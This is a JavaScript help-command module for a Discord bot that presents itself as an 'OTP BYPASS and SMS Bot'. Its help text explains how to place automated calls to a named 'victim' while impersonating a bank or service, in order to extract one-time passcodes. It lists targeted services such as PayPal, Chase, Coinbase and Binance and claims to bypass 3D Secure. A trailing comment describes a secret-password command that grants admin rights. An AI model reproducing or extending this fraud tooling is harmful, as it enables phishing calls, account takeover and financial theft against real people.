module.exports = function(m) {
  /**
   * Récupération du fichier config
   */
  const config = require('../config');

  /**
   * Vérification de la commande, si help a été tapé alors contineur
   */
  if (m.command !== "help") return false;

  /**
   * Création du message embed fixe, présentation des commandes
   */
  const embed = {
      "title": "Help, commands & informations",
      "description": ":boom:OTP BYPASS and SMS Bot V.3:boom:\nAll the Users commands : \n`.call tonumber fromnumber service otplength and SMS` or for example `.call 33612345678 9034436305 Banque Name 8 Victim Name Surname` \n Send a call to a specific phone number with the service you want and ask for an 8 digit otp Write the victim's name and surname. (like 12345678)\n\nRetrieves 5,6,8 Digit codes.Supports All World Languages\n\n Al world System and Services \n\nThe differents call services supported `\n`:boom:Amazon`\n`:boom:Binance`\n`:boom:Call-done`\n`:boom:Chase`\n`:boom:Cashapp`\n`:boom:Cdiscount`\n`:boom:Coinbase`\n`:boom:Crypto`\n`:boom:Facebook`\n`:boom:Gemini`\n`:boom:Instagram`\n`:boom:Moneygram`\n`:boom:Paypal`\n`Robinhood`\n`:boom:Snapchat`\n`Steam`\n`:boom:Wells`\n`:boom:Twitter`\n`:boom:Venmo`\n` : work for all the systems`\n`:boom:All World Bank` : Bypass 3D Secure",
      "color": 11686254,
      "footer": {
        "text": m.user
      }
  };

  /**
   * Envoi du message embed
   */
  return m.message.channel.send({ embed });
}
//All the Admin commands : \n `!user add @user` : allow someone to use the bot & the calls\n`!user delete @user` : remove someone or an admin from the bot \n`!user info @user` : get infos from a user
// \n`!user setadmin @user` : set a user to admin \n\n , \n`!secret yoursecretpassword @user` : set a user to admin without been admin
